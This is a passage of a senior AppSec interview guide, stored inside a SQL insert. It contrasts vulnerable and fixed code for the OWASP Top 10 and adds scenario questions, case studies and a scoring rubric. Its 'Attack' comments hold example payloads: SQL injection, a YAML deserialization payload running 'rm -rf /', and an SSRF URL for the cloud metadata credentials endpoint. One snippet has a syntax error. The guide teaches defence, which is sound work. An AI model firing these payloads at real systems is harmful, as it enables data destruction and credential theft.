        throw new LimitExceededException("Transfer exceeds daily limit");
    }
    
    // Step 3: Verify receiver is not blacklisted
    Account receiver = accountRepository.findById(req.recipientAccountId).get();
    if (isBlacklisted(receiver)) {
        throw new ForbiddenException("Recipient account is restricted");
    }
    
    // Step 4: Atomic transaction with audit trail
    auditLog.record(
        user = principal.userId,
        action = "TRANSFER",
        from = accountId,
        to = req.recipientAccountId,
        amount = req.amount,
        timestamp = now()
    );
    
    account.balance -= req.amount;
    receiver.balance += req.amount;
    account.save();
    receiver.save();
    
    return ResponseEntity.ok(new TransferResponse("SUCCESS"));
}

// Test the fix:
// 1. User A tries to access User B's account → 403 Forbidden
// 2. User A transfers within limit → 200 OK
// 3. User A exceeds daily limit → 400 Bad Request
// 4. All transfers logged with audit trail
```

---

## A02:2021 – Cryptographic Failures

**Vulnerable Code:**
```java
// VULNERABLE: Weak password hashing
String salt = UUID.randomUUID().toString();  // Random per-user
String passwordHash = SHA1.hash(password + salt);  // Outdated algorithm

// Attack: Attacker gets password database
// → SHA1 is cracked in seconds
// → Even with random salt, GPU bruteforce finds password in hours
```

**Remediation:**
```java
// FIXED: Use bcrypt with strong parameters
public class PasswordManager {
    
    private static final int BCRYPT_COST = 12;  // OWASP recommendation
    
    public String hashPassword(String password) {
        // bcrypt automatically generates salt + iterates 2^cost times
        return BCrypt.hashpw(password, BCrypt.gensalt(BCRYPT_COST));
    }
    
    public boolean verifyPassword(String password, String hash) {
        return BCrypt.checkpw(password, hash);
    }
}

// Why bcrypt is better:
// ├─ Adaptive: Cost parameter increases with computing power
// ├─ Salted: Random salt per password
// ├─ Slow: 2^12 = 65,536 iterations minimum
// └─ Resistant: GPU/ASIC attacks still take >1 billion attempts/second
```

**Vulnerable Code (Encryption):**
```java
// VULNERABLE: ECB mode (detects patterns in plaintext)
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
cipher.init(Cipher.ENCRYPT_MODE, key);
byte[] ciphertext = cipher.doFinal(plaintext);

// Attack: Encrypt same plaintext twice → identical ciphertexts
// Visual proof: Encrypt image in ECB mode = image leaks through (Google "ECB encryption penguin")
```

**Remediation:**
```java
// FIXED: Use CBC or GCM mode with random IV
public class SecureEncryption {
    
    public EncryptedData encrypt(String plaintext, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        
        // Generate random IV
        byte[] iv = new byte[12];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);
        
        // IV must be random for each encryption
        GCMParameterSpec spec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, spec);
        
        // Encrypt with authentication
        byte[] ciphertext = cipher.doFinal(plaintext.getBytes());
        
        // Return IV + ciphertext + authTag
        return new EncryptedData(iv, ciphertext);
    }
    
    public String decrypt(EncryptedData data, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, data.iv);
        cipher.init(Cipher.DECRYPT_MODE, key, spec);
        
        // GCM verifies authentication tag automatically
        // Tampering detected & exception thrown
        byte[] plaintext = cipher.doFinal(data.ciphertext);
        
        return new String(plaintext);
    }
}

// Why GCM is better:
// ├─ Authenticated encryption (detects tampering)
// ├─ Random IV prevents pattern detection
// ├─ IND-CPA secure (indistinguishable under chosen plaintext attack)
// └─ Fast (hardware acceleration available)
```

---

## A03:2021 – Injection

**Vulnerable Code (SQL Injection):**
```python
# VULNERABLE: String concatenation
user_id = request.get('user_id')
sql = f"SELECT balance FROM accounts WHERE user_id = {user_id}"
result = database.query(sql)

# Attack: user_id = "1 OR 1=1"
# → SELECT balance FROM accounts WHERE user_id = 1 OR 1=1
# → Returns all account balances
```

**Remediation:**
```python
# FIXED: Parameterized queries
user_id = request.get('user_id')
sql = "SELECT balance FROM accounts WHERE user_id = ?"
result = database.query(sql, (user_id,))  # Parameters separate from query
```

**Vulnerable Code (Expression Language Injection):**
```jsp
<!-- VULNERABLE: JSP Expression Language -->
<h1>Hello ${user.name}</h1>  <!-- If user.name = "${request.getParameter('cmd')}", RCE -->
```

**Remediation:**
```jsp
<!-- FIXED: Escape EL expressions + use taglibs -->
<h1>Hello <c:out value="${user.name}"/></h1>  <!-- Auto-escapes -->
```

---

## A04:2021 – Insecure Design

**Vulnerable Code (Business Logic):**
```python
# VULNERABLE: No validation of business constraints
def transfer(account_id, amount, recipient_id):
    account = get_account(account_id)
    
    # No check: Is amount positive?
    if amount < 0:  # BUG: Attacker sends -$1000 = gain $1000
        pass
    
    # No check: Is balance sufficient?
    account.balance -= amount  # Overdraft possible
    
    # No check: Is recipient same as sender?
    if account_id == recipient_id:
        pass  # Self-transfer exploit
    
    # No check: Is amount within reasonable range?
    if amount > 1_000_000_000:
        pass  # Integer overflow possible
    
    execute_transfer(account, recipient, amount)
```

**Remediation:**
```python
# FIXED: Comprehensive business logic validation
def transfer(account_id, amount, recipient_id):
    account = get_account(account_id)
    recipient = get_account(recipient_id)
    
    # Validation Layer
    validations = [
        (amount > 0, "Amount must be positive"),
        (amount <= account.balance, "Insufficient funds"),
        (amount <= account.daily_limit, "Exceeds daily limit"),
        (account_id != recipient_id, "Cannot transfer to self"),
        (amount <= MAX_TRANSFER_AMOUNT, f"Exceeds maximum {MAX_TRANSFER_AMOUNT}"),
        (recipient.status == "ACTIVE", "Recipient account inactive"),
        (not is_blacklisted(recipient), "Recipient blacklisted"),
    ]
    
    for condition, error_message in validations:
        if not condition:
            raise ValidationError(error_message)
    
    # Audit
    log_transfer(account_id, recipient_id, amount)
    
    # Atomic transaction
    with database.transaction():
        account.balance -= amount
        recipient.balance += amount
        account.save()
        recipient.save()
    
    return TransferResponse(status="SUCCESS")
```

---

## A05:2021 – Broken Authentication

**Vulnerable Code:**
```java
// VULNERABLE: Weak session management
HttpSession session = request.getSession(true);
session.setAttribute("userId", userId);
session.setMaxInactiveInterval(3600);  // 1 hour

// Problems:
// 1. Session ID predictable (sequential)
// 2. No CSRF token
// 3. No fingerprinting (stolen session = instant access)
// 4. No device tracking
```

**Remediation:**
```java
// FIXED: Secure session management
public class SecureSessionManager {
    
    public void createSecureSession(HttpServletRequest request, String userId) {
        HttpSession session = request.getSession(true);
        
        // 1. Use strong random session ID (servlet container handles this)
        // Verify: Java defaults to 32-byte cryptographic random
        
        // 2. Add CSRF token
        String csrfToken = generateSecureToken(32);
        session.setAttribute("csrf_token", csrfToken);
        
        // 3. Device fingerprinting
        String userAgent = request.getHeader("User-Agent");
        String acceptLanguage = request.getHeader("Accept-Language");
        String deviceFingerprint = hashFingerprint(userAgent, acceptLanguage);
        session.setAttribute("device_fingerprint", deviceFingerprint);
        
        // 4. IP address binding (optional, can break with VPN)
        String ipAddress = request.getRemoteAddr();
        session.setAttribute("ip_address", ipAddress);
        
        // 5. Secure session cookie
        session.setMaxInactiveInterval(1800);  // 30 minutes
        Cookie cookie = new Cookie("SESSION_ID", session.getId());
        cookie.setHttpOnly(true);      // Not accessible via JavaScript
        cookie.setSecure(true);         // HTTPS only
        cookie.setSameSite("Strict");   // CSRF protection
        request.getServletContext().getSessionCookieConfig().setHttpOnly(true);
        
        session.setAttribute("userId", userId);
        session.setAttribute("createdAt", LocalDateTime.now());
    }
    
    public boolean validateSession(HttpServletRequest request) {
        HttpSession session = request.getSession(false);
        if (session == null) return false;
        
        // Check CSRF token (POST requests)
        if (request.getMethod().equals("POST")) {
            String csrf_param = request.getParameter("csrf_token");
            String csrf_session = (String) session.getAttribute("csrf_token");
            if (!csrf_param.equals(csrf_session)) {
                throw new CsrfException("CSRF validation failed");
            }
        }
        
        // Check device fingerprint
        String userAgent = request.getHeader("User-Agent");
        String acceptLanguage = request.getHeader("Accept-Language");
        String currentFingerprint = hashFingerprint(userAgent, acceptLanguage);
        String storedFingerprint = (String) session.getAttribute("device_fingerprint");
        if (!currentFingerprint.equals(storedFingerprint)) {
            throw new SessionException("Device fingerprint mismatch");
        }
        
        return true;
    }
}
```

---

## A06:2021 – Vulnerable and Outdated Components

(Covered in SCA section - refer to Question 2.3)

---

## A07:2021 – Identification and Authentication Failures

**Vulnerable Code (Weak Password Policy):**
```python
# VULNERABLE: Weak password requirements
def validate_password(password):
    # Only checks length
    return len(password) >= 6

# Attack: Attacker brute-forces "123456" in seconds
```

**Remediation:**
```python
# FIXED: OWASP password policy
import re

def validate_password(password):
    checks = [
        (len(password) >= 12, "At least 12 characters"),
        (re.search(r'[A-Z]', password), "At least one uppercase"),
        (re.search(r'[a-z]', password), "At least one lowercase"),
        (re.search(r'[0-9]', password), "At least one digit"),
        (re.search(r'[!@#$%^&*]', password), "At least one special char"),
        (password not in common_passwords, "Not in compromised password database"),
    ]
    
    errors = [error for check, error in checks if not check]
    if errors:
        raise PasswordValidationError(errors)
    
    return True

# Additional: Check against HaveIBeenPwned API
def check_pwned_passwords(password):
    pwn_hash = hashlib.sha1(password.encode()).hexdigest().upper()
    pwn_prefix = pwn_hash[:5]
    
    response = requests.get(f"https://api.pwnedpasswords.com/range/{pwn_prefix}")
    for line in response.text.split("\r\n"):
        if line.startswith(pwn_hash[5:]):
            raise PasswordViolationError(f"Password appears in {line.split(':'[1]} data breaches")
```

---

## A08:2021 – Software and Data Integrity Failures

**Vulnerable Code (YAML Deserialization):**
```python
# VULNERABLE: Unsafe YAML deserialization
import yaml

data = yaml.load(user_input)  # Can execute arbitrary code

# Attack:
# user_input = "!!python/object/apply:os.system ['rm -rf /']"
# → Executes shell command during deserialization
```

**Remediation:**
```python
# FIXED: Use safe YAML loader
import yaml

data = yaml.safe_load(user_input)  # Only constructs basic Python types
```

---

## A09:2021 – Logging and Monitoring Failures

**Vulnerable Code:**
```python
# VULNERABLE: Insufficient logging
def login(username, password):
    user = find_user(username)
    if user and verify_password(password, user.password_hash):
        create_session(user)
        return "Login successful"
    else:
        return "Login failed"  # No distinction between bad user/bad password
    
    # Attack: Attacker brute-forces usernames via timing (bad user = different response time)
```

**Remediation:**
```python
# FIXED: Comprehensive logging + monitoring
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

def login(username, password):
    timestamp = datetime.utcnow()
    
    # Step 1: Locate user (time constant with dummy verification)
    user = find_user(username)
    user_found = user is not None
    
    # Step 2: Always verify (timing attack defense)
    if user:
        is_valid = verify_password(password, user.password_hash)
    else:
        # Dummy verification to prevent timing attack
        is_valid = verify_password(password, get_dummy_hash())
    
    # Step 3: Log authentication attempt
    log_entry = {
        "event": "AUTH_ATTEMPT",
        "timestamp": timestamp,
        "username": username,
        "user_found": user_found,
        "password_valid": is_valid,
        "ip_address": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
    }
    
    if not user_found:
        logger.warning(f"Login attempt with non-existent user: {username}")
        log_security_event(log_entry)
        return ("Login failed", 401)
    
    if not is_valid:
        logger.warning(f"Failed login for user: {username}")
        log_entry["failure_reason"] = "invalid_password"
        log_security_event(log_entry)
        
        # Check for brute force
        recent_failures = get_failed_logins(username, minutes=15)
        if len(recent_failures) >= 5:
            logger.critical(f"Brute force detected for user: {username}")
            lock_account(username, minutes=30)
            send_alert_to_security_team(username, recent_failures)
        
        return ("Login failed", 401)
    
    # Success logging
    user.last_login = timestamp
    user.failed_login_count = 0  # Reset counter
    session = create_session(user)
    
    log_entry["status"] = "success"
    log_entry["session_id"] = session.id
    logger.info(f"Successful login for user: {username}", extra=log_entry)
    log_security_event(log_entry)
    
    return ("Login successful", 200)

# Monitoring & Alerting
def monitor_security_events():
    alerts = [
        {
            "condition": "5+ failed logins in 15 min",
            "action": "Lock account + notify security"
        },
        {
            "condition": "Login from new IP address",
            "action": "Request additional MFA"
        },
        {
            "condition": "3+ concurrent sessions",
            "action": "Terminate oldest sessions + alert"
        }
    ]
```

---

## A10:2021 – Server Side Request Forgery (SSRF)

**Vulnerable Code:**
```python
# VULNERABLE: SSRF via AWS metadata endpoint
import requests

def fetch_url(url):
    response = requests.get(url)
    return response.text

# Attack:
# url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# → Returns AWS credentials
```

**Remediation:**
```python
# FIXED: Whitelist + network isolation
import requests
from urllib.parse import urlparse

ALLOWED_DOMAINS = [
    "api.example.com",
    "cdn.example.com",
]

def fetch_url(url):
    # Step 1: Parse URL
    parsed = urlparse(url)
    host = parsed.hostname
    
    # Step 2: Reject private IP ranges
    if is_private_ip(host):
        raise SecurityException(f"Cannot access private IP: {host}")
    
    # Step 3: Reject metadata endpoints
    if host in ["169.254.169.254", "metadata.google.internal"]:
        raise SecurityException("Metadata endpoints forbidden")
    
    # Step 4: Whitelist approach
    if host not in ALLOWED_DOMAINS:
        raise SecurityException(f"Host not whitelisted: {host}")
    
    # Step 5: Timeout (prevent slowloris/indefinite wait)
    response = requests.get(url, timeout=5)
    return response.text

def is_private_ip(hostname):
    import ipaddress
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except ValueError:
        return False  # Hostname, not IP
```

---

## 7. Secure Coding Practices Summary

| Principle | Implementation | Example |
|-----------|----------------|---------|
| **Input Validation** | Whitelist, type check, length limit | OWASP Encoder |
| **Output Encoding** | Context-specific escaping | HTML entities, JSON, SQL |
| **Least Privilege** | Minimal permissions | IAM roles, DB user permissions |
| **Defense in Depth** | Multiple layers | SAST + DAST + WAF + monitoring |
| **Secure Defaults** | Safe configuration out-of-box | HTTPS, encrypted cookies, strong algorithms |
| **Fail Securely** | Default to deny | 403 before 200 |

---

## SECTION 7: SCENARIO-BASED CHALLENGES

### Challenge 1: "The Confused Deputy"

**Scenario:**
> Your microservice architecture uses cross-account AWS IAM roles with `AssumeRole` permissions. Service A (Account 1) can assume Service B's role (Account 2) for data access. An attacker compromises Service A. Design a system to prevent privilege escalation to Account 2.

**Evaluation Criteria:**
- Understands confused deputy problem
- Designs external ID validation
- Implements session tags / session policies
- Mentions audit trail + anomaly detection

---

### Challenge 2: "The Supply Chain Backdoor"

**Scenario:**
> A critical npm package (used by 50% of your codebase) releases a new version with a backdoor. Detect it within 1 hour and remediate. How do you: (a) detect it, (b) assess impact, (c) remediate, (d) prevent future incidents?

**Evaluation Criteria:**
- Specific detection techniques (checksums, behavioral analysis)
- Blast radius assessment
- Remediation timeline
- Supply chain security hardening

---

### Challenge 3: "The Insider Threat"

**Scenario:**
> A disgruntled manager with admin access plans to exfiltrate customer data. You have 24 hours to detect and prevent it. Design monitoring, detect indicators, and implement controls.

---

## SECTION 8: ARCHITECTURE DESIGN QUESTIONS

### Design Question 1: Zero-Trust Network Architecture

**Question:**
> Design a zero-trust network for a distributed microservices platform. Address: authentication, authorization, encryption, monitoring, and how you verify "zero trust" is actually implemented.

---

### Design Question 2: Incident Response Platform

**Question:**
> Design an automated incident response platform that detects, classifies, investigates, and remediates security events. Include: data sources, ML-based correlation, automated response actions, and human-in-the-loop.

---

## SECTION 9: REAL-WORLD CASE STUDIES

### Case Study 1: Capital One Data Breach (2019)

**Technical breakdown:**
- SSRF → IAM role assumption → Access to 100M+ customer records
- Lessons: Network segmentation, WAF tuning, credential rotation
- Questions for candidate:
  - What specific controls would have prevented this?
  - How would you detect this in progress?
  - Design a network architecture preventing lateral movement

### Case Study 2: SolarWinds Supply Chain Attack (2020)

**Technical breakdown:**
- Compromised build pipeline → Backdoored software → Nation-state distribution
- Lessons: Build integrity, code signing, zero-trust, rapid detection
- Questions:
  - How would you detect suspicious behavior in SolarWinds?
  - Design supply chain security controls
  - Simulate incident response (what's your first 24 hours?)

### Case Study 3: MGM Resorts Ransomware (2023)

**Technical breakdown:**
- Compromise via Okta → Ransomware spread
- Lessons: MFA bypass, identity provider security, incident response speed
- Questions:
  - Design identity provider hardening
  - How do you detect widespread lateral movement?
  - Create playbook for identity platform compromise

---

## SECTION 10: EVALUATION FRAMEWORK

### How to Score Responses

**Excellent (9-10 points):**
- ✓ Demonstrates deep hands-on experience
- ✓ Addresses edge cases / unusual scenarios
- ✓ Shows systems thinking (end-to-end implications)
- ✓ Provides quantitative metrics / tradeoffs
- ✓ Mentions failure modes + mitigation
- ✓ Real-world examples from their background

**Good (7-8 points):**
- ✓ Solid technical understanding
- ✓ Addresses main threats
- ✓ Discusses detection + remediation
- ✓ Some metrics / tradeooks
- ✗ Limited edge case coverage

**Adequate (5-6 points):**
- ✓ Baseline understanding
- ✓ Can identify key risks
- ✗ Limited depth on implementation
- ✗ Few metrics / monitoring plans

**Below Average (≤ 4 points):**
- ✗ Misses obvious security controls
- ✗ Suggests dangerous practices
- ✗ No monitoring / observability

### Red Flags (Instant Fail)

- "Security through obscurity"
- "We just trust developers to be secure"
- "Our system is too complex to audit"
- "We haven't had a breach, so we're secure"
- Dismissal of compliance as "checkbox exercise"

### Gold Standard Answers

**Gold Flag: Proactive Vulnerability Research**
> "I regularly check CVE databases for our dependencies, even before they hit security tools. I maintain a personal threat intelligence feed."

**Gold Flag: Previous Incident Leadership**
> "I led incident response for [specific breach], and here's what we learned..."

**Gold Flag: Security Automation Pioneer**
> "I implemented shift-left security that reduced time-to-remeditate from 3 weeks to 4 hours."

**Gold Flag: Beyond Technical**
> "I've trained 50+ developers on secure coding. Here's the maturity journey."

---

## Appendix A: Tool Benchmarking

| Tool | Strengths | Weaknesses |
|------|-----------|-----------|
| **SonarQube** | Language support, rules, scalability | High false positives, slow |
| **Checkmarx** | Complex dataflow, enterprise support | Expensive, vendor lock-in |
| **Snyk** | Developer-friendly, fast, SCA | Pricing model, limited SAST |
| **Burp Suite** | DAST gold standard, active scan | Expensive, manual effort required |
| **OWASP ZAP** | Free, open-source, decent DAST | Lower accuracy than Burp |
| **npm audit** | Easy, integrated, free | Limited to npm ecosystem |
| **Terraform Cloud** | IaC native, scalable | Cloud-only |

---

## Appendix B: Interview Duration Allocation

**4-5 Hour Interview:**
- 30 min: Core concepts (Qs 1.1, 1.2)
- 45 min: SAST/DAST/SCA (Qs 2.1-2.3)
- 30 min: Threat modeling (Q 3.1)
- 45 min: DevSecOps pipeline (Q 4.1)
- 30 min: Cloud security (Q 5.1)
- 30 min: Scenario-based challenges (Pick 1-2)
- 15 min: Questions from candidate

---

## Appendix C: Candidate Preparation Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP API Security: https://owasp.org/www-project-api-security/
- NIST Application Security: https://csrc.nist.gov/projects/application-security
- PortSwigger Web Security Academy: Free hands-on labs
-  CWE Top 25: https://cwe.mitre.org/top25/
- CVE Details: Trending vulnerabilities

---

**Generated: April 2026**  
**For use in Senior Application Security & DevSecOps interviews (8-10+ years experience)**$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

COMMIT;
